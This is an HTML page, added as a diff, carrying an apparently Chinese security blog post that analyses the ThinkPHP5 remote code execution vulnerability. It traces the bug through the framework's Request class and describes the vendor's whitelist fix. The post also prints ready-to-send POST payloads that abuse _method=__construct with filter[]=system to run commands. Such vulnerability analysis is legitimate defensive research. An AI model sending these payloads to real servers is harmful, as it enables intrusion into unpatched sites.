@@ -1,0 +1,95 @@
+<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="与其哀叹，不如埋头苦干"><title>ThinkPHP5漏洞分析之代码执行(十) | Mochazz's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/"></a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/tx.jpeg" width="128" height="128"></a><h1 class="ttl"><a href="/">Mochazz's blog</a></h1></div><p class="m-desc">与其哀叹，不如埋头苦干</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><span class="dot">●</span><span>友链</span><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lmxspace.com">l1nk3r</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.virzz.com">Virink</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://sec2hack.com">Wfox</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lsafe.org">离心</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.kingkk.com">kingkk</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.hpdoger.cn/">hpdoger</a></li></ul></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">ThinkPHP5漏洞分析之代码执行(十)</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2019/04/09/ThinkPHP5漏洞分析之代码执行10/">2019-04-09</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/代码审计/">代码审计</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>本系列文章将针对 <strong>ThinkPHP</strong> 的历史漏洞进行分析，今后爆出的所有 <strong>ThinkPHP</strong> 漏洞分析，也将更新于 <a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a> 项目上。本篇文章，将分析 <strong>ThinkPHP</strong> 中存在的 <strong>远程代码执行</strong> 漏洞。</p>
+<h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong>。不同版本 <strong>payload</strong> 需稍作调整（以下payload未全测试，部分来自网络）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ThinkPHP &lt;= 5.0.13</span><br><span class="line">POST /?s=index/index</span><br><span class="line">s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug</span><br><span class="line">POST /</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST /?s=xxx HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>通过官网下载 <strong>ThinkPHP 5.0.23</strong> 完整版代码，搭建好后，发送如下数据包，即可触发 <strong>远程代码执行漏洞</strong> 。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/1.png" alt="1"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先在官方发布的 <strong>5.0.24</strong> 版本更新说明中，发现其中提到该版本包含了一个安全更新。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/2.png" alt="2"></p>
+<p>我们可以查阅其 <strong>commit</strong> 记录，发现其改进了。接下来，我们直接跟进代码一探究竟。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/3.png" alt="3"></p>
+<p>这次我们不再直接跟着 <strong>payload</strong> 进行漏洞分析，而是通过官方的些许描述和 <strong>github commit</strong> 记录，来还原漏洞。从官方的修复代码中，我们可以很明显的看出 <strong>$method</strong> 来自可控的 <strong>$_POST</strong> 数组，而且在获取之后没有进行任何检查，直接把它作为 <strong>Request</strong> 类的方法进行调用，同时，该方法传入的参数是可控数据 <strong>$_POST</strong> 。也就相当于可以随意调用 <strong>Request</strong> 类的部分方法。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/4.png" alt="4"></p>
+<p>同时，我们观察到 <strong>Request</strong> 类的 <strong>__construct</strong> 方法中存在类属性覆盖的功能，这对我们之后的利用非常有利， <strong>Request</strong> 类的所有属性如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> $get                  <span class="keyword">protected</span> <span class="keyword">static</span> $instance;</span><br><span class="line"><span class="keyword">protected</span> $post                 <span class="keyword">protected</span> $method;</span><br><span class="line"><span class="keyword">protected</span> $request              <span class="keyword">protected</span> $domain;</span><br><span class="line"><span class="keyword">protected</span> $route                <span class="keyword">protected</span> $url;</span><br><span class="line"><span class="keyword">protected</span> $put;                 <span class="keyword">protected</span> $baseUrl;</span><br><span class="line"><span class="keyword">protected</span> $session              <span class="keyword">protected</span> $baseFile;</span><br><span class="line"><span class="keyword">protected</span> $file                 <span class="keyword">protected</span> $root;</span><br><span class="line"><span class="keyword">protected</span> $cookie               <span class="keyword">protected</span> $pathinfo;</span><br><span class="line"><span class="keyword">protected</span> $server               <span class="keyword">protected</span> $path;</span><br><span class="line"><span class="keyword">protected</span> $header               <span class="keyword">protected</span> $routeInfo </span><br><span class="line"><span class="keyword">protected</span> $mimeType             <span class="keyword">protected</span> $env;</span><br><span class="line"><span class="keyword">protected</span> $content;             <span class="keyword">protected</span> $dispatch </span><br><span class="line"><span class="keyword">protected</span> $filter;              <span class="keyword">protected</span> $module;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> $hook          <span class="keyword">protected</span> $controller;</span><br><span class="line"><span class="keyword">protected</span> $bind                 <span class="keyword">protected</span> $action;</span><br><span class="line"><span class="keyword">protected</span> $input;               <span class="keyword">protected</span> $langset;</span><br><span class="line"><span class="keyword">protected</span> $cache;               <span class="keyword">protected</span> $param   </span><br><span class="line"><span class="keyword">protected</span> $isCheckCache;</span><br></pre></td></tr></table></figure>
+<p>我们继续跟进程序，会发现如果框架在配置文件中开启了 <strong>debug</strong> 模式（ <code>&#39;app_debug&#39;=&gt; true</code> ），程序会调用 <strong>Request</strong> 类的 <strong>param</strong> 方法。这个方法我们需要特别关注了，因为 <strong>Request</strong> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <strong>filterValue</strong> 方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/5.png" alt="5"></p>
+<p>我们跟进 <strong>param</strong> 方法。发现其调用 <strong>method</strong> 方法（上图 <strong>第16行</strong> ）。其会调用 <strong>server</strong> 方法，而在 <strong>server</strong> 方法中把 <strong>$this-&gt;server</strong> 传入了 <strong>input</strong> 方法。这个 <strong>$this-&gt;server</strong> 的值，我们可以通过先前 <strong>Request</strong> 类的 <strong>__construct</strong> 方法来覆盖赋值。也就是说，可控数据作为 <strong>$data</strong> 传入 <strong>input</strong> 方法，然后 <strong>$data</strong> 会被 <strong>filterValue</strong> 方法使用 <strong>$filter</strong> 过滤器处理。其中 <strong>$filter</strong> 的值部分来自 <strong>$this-&gt;filter</strong> ，又是可以通过先前 <strong>Request</strong> 类的 <strong>__construct</strong> 方法来覆盖赋值。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/6.png" alt="6"></p>
+<p>接下来就是我们很熟悉的 <strong>filterValue</strong> 方法调用 <strong>call_user_func</strong> 处理数据的过程，代码执行也就是发生在这里。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/7.png" alt="7"></p>
+<p>上面我们讲的是开启框架调试模式下，触发 <strong>远程代码执行</strong> 漏洞，接下来我们再来看看如果没有开启框架调试模式，是否可以利用该漏洞。在 <strong>run</strong> 方法中，会执行一个 <strong>exec</strong> 方法，当该方法中的 <strong>$dispatch[‘type’]</strong> 等于 <strong>controller</strong> 或者 <strong>method</strong> 时，又会调用 <strong>Request</strong> 类的 <strong>param</strong> 方法。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/8.png" alt="8"></p>
+<p>跟进 <strong>Request</strong> 类的 <strong>param</strong> 方法，我们发现其后面的调用过程又会和先前的分析一样了，这里不再赘述。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/9.png" alt="9"></p>
+<p>现在我们还要解决一个问题，就是如何让 <strong>$dispatch[‘type’]</strong> 等于 <strong>controller</strong> 或者 <strong>method</strong> 。通过跟踪代码，我们发现 <strong>$dispatch[‘type’]</strong> 来源于 <strong>parseRule</strong> 方法中的 <strong>$result</strong> 变量，而 <strong>$result</strong> 变量又与 <strong>$route</strong> 变量有关系。这个 <strong>$route</strong> 变量取决于程序中定义的路由地址方式。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/10.png" alt="10"></p>
+<p> <strong>ThinkPHP5</strong> 中支持 <strong>5种</strong> 路由地址方式定义：</p>
+<table>
+<thead>
+<tr>
+<th>定义方式</th>
+<th>定义格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>方式1：路由到模块/控制器</td>
+<td>‘[模块/控制器/操作]?额外参数1=值1&amp;额外参数2=值2…’</td>
+</tr>
+<tr>
+<td>方式2：路由到重定向地址</td>
+<td>‘外部地址’（默认301重定向） 或者 [‘外部地址’,’重定向代码’]</td>
+</tr>
+<tr>
+<td>方式3：路由到控制器的方法</td>
+<td>‘@[模块/控制器/]操作’</td>
+</tr>
+<tr>
+<td>方式4：路由到类的方法</td>
+<td>‘\完整的命名空间类::静态方法’ 或者 ‘\完整的命名空间类@动态方法’</td>
+</tr>
+<tr>
+<td>方式5：路由到闭包函数</td>
+<td>闭包函数定义（支持参数传入）</td>
+</tr>
+</tbody>
+</table>
+<p>而在 <strong>ThinkPHP5</strong> 完整版中，定义了验证码类的路由地址。程序在初始化时，会通过自动类加载机制，将 <strong>vendor</strong> 目录下的文件加载，这样在 <strong>GET</strong> 方式中便多了这一条路由。我们便可以利用这一路由地址，使得 <strong>$dispatch[‘type’]</strong> 等于 <strong>method</strong> ，从而完成 <strong>远程代码执行</strong> 漏洞。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/11.png" alt="11"></p>
+<p>所以最终的 <strong>payload</strong> 类似下面这样：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> HTTP/1.1</span><br><span class="line">    ⋮</span><br><span class="line"><span class="attribute">Content-Length</span>: 59</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al</span><br><span class="line"># 或者</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方的修复方法是：对请求方法 <strong>$method</strong> 进行白名单校验。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/3.png" alt="3"></p>
+<h2 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h2><p>最后，再通过一张攻击流程图来回顾整个攻击过程。</p>
+<p><img src="/img/ThinkPHP5漏洞分析之代码执行10/12.png" alt="12"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html" target="_blank" rel="noopener">ThinkPHP 5.x RCE 漏洞分析与利用总结</a> </p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="https://mochazz.github.io">Mochazz</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2019/04/09/ThinkPHP5漏洞分析之代码执行10/">https://mochazz.github.io/2019/04/09/ThinkPHP5漏洞分析之代码执行10/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://mochazz.github.io">Mochazz的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/ThinkPHP/">ThinkPHP</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2019/04/08/ThinkPHP5漏洞分析之代码执行9/">ThinkPHP5漏洞分析之代码执行(九) &gt;</a></div><div id="valine-comment"><style type="text/css">.v * { color: #CECECE; }
+.v a { color: #0F9FB4; }
+.v a:hover { color: #216C73; }
+.v li { list-style: inherit; }
+.v .vwrap { border: 1px solid #223441; border-radius: 0; }
+.v .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.v .vbtn { border-radius: 0; color: #cecece; background: none; }
+.v .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.v .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.v .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.v code, .v pre,.v .vlist .vcard .vhead .vsys { background: #203240; }
+.v .vlist .vcard .vcontent.expand:before { background: linear-gradient(180deg,hsla(206,33%,19%,0),hsla(206,33%,19%,.9)); }
+.v .vlist .vcard .vcontent.expand:after { background: hsla(206,33%,19%,.9); }</style><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
+  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
+  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2017 - 2019 <a href="/." rel="nofollow">Mochazz's blog</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
